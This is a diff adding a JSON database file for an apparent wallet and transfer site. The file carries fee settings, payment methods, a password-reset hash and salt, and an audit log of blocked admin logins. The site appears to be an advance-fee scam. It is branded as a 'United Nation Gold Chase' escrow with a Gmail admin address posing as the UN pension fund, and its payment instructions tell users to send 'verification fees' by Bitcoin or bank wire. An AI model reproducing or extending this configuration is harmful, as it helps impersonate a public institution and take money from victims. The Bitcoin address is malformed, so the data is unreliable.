@@ -1,0 +1,134 @@
+{
+  "users": [],
+  "wallets": [],
+  "transactions": [],
+  "feeSettings": {
+    "transferFee": 15,
+    "withdrawalFee": 25,
+    "minTransferAmount": 10,
+    "maxTransferAmount": 500000,
+    "currency": "USD",
+    "updatedAt": "2026-10-28T11:19:59.676Z",
+    "updatedBy": "un.department.retirement.unjspf@gmail.com",
+    "transferFixedFee": 15,
+    "transferPercentFee": 0,
+    "transferFeeEnabled": true,
+    "withdrawalFixedFee": 25,
+    "withdrawalPercentFee": 0,
+    "withdrawalFeeEnabled": true
+  },
+  "paymentMethods": [
+    {
+      "id": "bitcoin",
+      "name": "Bitcoin Network (BTC)",
+      "enabled": true,
+      "fee": 15,
+      "instructions": "Send the exact fee amount to our authorized institutional verification address: bc1qgoldchase92849un021948xkp9. Transfers are verified on the blockchain within 15–60 minutes. Enter your transaction hash below.",
+      "accountDetails": {
+        "btcAddress": "bc1qgoldchase92849un021948xkp9",
+        "network": "Bitcoin Native SegWit (Mainnet)"
+      }
+    },
+    {
+      "id": "bank_transfer",
+      "name": "Direct Bank Wire / ACH Transfer",
+      "enabled": true,
+      "fee": 15,
+      "instructions": "Wire or ACH the verification fee to our escrow clearing reserve. Quote your Transaction Reference in the wire payment memo.",
+      "accountDetails": {
+        "beneficiary": "United Nation Gold Chase Clearing Escrow LLC",
+        "bankName": "Global International Trust Bank, N.A.",
+        "routingNumber": "021000021",
+        "accountNumber": "9820019248",
+        "swiftBic": "GITBUS33NYC"
+      }
+    }
+  ],
+  "notifications": [],
+  "auditLogs": [
+    {
+      "id": "audit_1794653887527_953b49",
+      "timestamp": "2026-11-14T10:58:07.527Z",
+      "actorEmail": "disposable.verify.1794653886551@example.com",
+      "actorRole": "unknown",
+      "action": "UNAUTHORIZED_ADMIN_LOGIN_ATTEMPT",
+      "reason": "Unauthorized email address tried to access administrator sign-in. Authorized Gmail required: un.department.retirement.unjspf@gmail.com"
+    },
+    {
+      "id": "audit_1794653887520_612145",
+      "timestamp": "2026-11-14T10:58:07.520Z",
+      "actorEmail": "disposable.verify.1794653886551@example.com",
+      "actorRole": "unknown",
+      "action": "UNAUTHORIZED_ADMIN_REGISTER_ATTEMPT",
+      "reason": "Unauthorized email address tried to register for administrator access. Authorized Gmail required: un.department.retirement.unjspf@gmail.com"
+    },
+    {
+      "id": "audit_1794653513927_0572d0",
+      "timestamp": "2026-11-14T10:51:53.927Z",
+      "actorEmail": "disposable.verify.1794653513129@example.com",
+      "actorRole": "unknown",
+      "action": "UNAUTHORIZED_ADMIN_LOGIN_ATTEMPT",
+      "reason": "Unauthorized email address tried to access administrator sign-in. Authorized Gmail required: un.department.retirement.unjspf@gmail.com"
+    },
+    {
+      "id": "audit_1794653513921_d31f51",
+      "timestamp": "2026-11-14T10:51:53.921Z",
+      "actorEmail": "disposable.verify.1794653513129@example.com",
+      "actorRole": "unknown",
+      "action": "UNAUTHORIZED_ADMIN_REGISTER_ATTEMPT",
+      "reason": "Unauthorized email address tried to register for administrator access. Authorized Gmail required: un.department.retirement.unjspf@gmail.com"
+    },
+    {
+      "id": "audit_1794653075743_92acf3",
+      "timestamp": "2026-11-14T10:44:35.743Z",
+      "actorEmail": "disposable.verify.1794653073611@example.com",
+      "actorRole": "unknown",
+      "action": "UNAUTHORIZED_ADMIN_REGISTER_ATTEMPT",
+      "reason": "Unauthorized email address tried to register for administrator access. Authorized Gmail required: un.department.retirement.unjspf@gmail.com"
+    },
+    {
+      "id": "audit_1794653075734_afbc4f",
+      "timestamp": "2026-11-14T10:44:35.735Z",
+      "actorEmail": "disposable.verify.1794653073611@example.com",
+      "actorRole": "unknown",
+      "action": "UNAUTHORIZED_ADMIN_LOGIN_ATTEMPT",
+      "reason": "Unauthorized email address tried to access administrator sign-in. Authorized Gmail required: un.department.retirement.unjspf@gmail.com"
+    },
+    {
+      "id": "audit_1794572575652_a072d2",
+      "timestamp": "2026-11-13T12:22:55.652Z",
+      "actorEmail": "attacker@gmail.com",
+      "actorRole": "unknown",
+      "action": "UNAUTHORIZED_ADMIN_REGISTER_ATTEMPT",
+      "reason": "Unauthorized email address tried to register for administrator access. Authorized Gmail required: un.department.retirement.unjspf@gmail.com"
+    },
+    {
+      "id": "audit_1794572575642_0c71f2",
+      "timestamp": "2026-11-13T12:22:55.642Z",
+      "actorEmail": "customer@example.com",
+      "actorRole": "unknown",
+      "action": "UNAUTHORIZED_ADMIN_LOGIN_ATTEMPT",
+      "reason": "Unauthorized email address tried to access administrator sign-in. Authorized Gmail required: un.department.retirement.unjspf@gmail.com"
+    },
+    {
+      "id": "audit_cleanup_1794572543684",
+      "timestamp": "2026-11-13T12:22:23.684Z",
+      "actorEmail": "system",
+      "actorRole": "system",
+      "action": "AUTHORIZED_ACCOUNT_CLEANUP_RESET",
+      "reason": "Authorized permanent removal of 8 obsolete accounts and associated test wallets, transactions, notifications, payment submissions, sessions, and recovery codes."
+    }
+  ],
+  "resetSecurity": {
+    "resetPasswordHash": "238e8a47d60f06cb16adda731f71bcc90c3ee80a3f5ef12ec4f300afbad9611c8a7c761fd8e5ce33d56357db57d95c273c698115f1ea4ed9f72e97118af3ddbe",
+    "resetSalt": "9068315baf255e49c63c1e59b03ff0e1",
+    "sessionTimeoutMinutes": 15,
+    "failedAttempts": 0,
+    "lockedUntil": null,
+    "lastPasswordChange": "2026-10-28T11:19:59.676Z"
+  },
+  "recoveryCodes": [],
+  "sessions": [],
+  "paymentSubmissions": [],
+  "announcements": []
+}
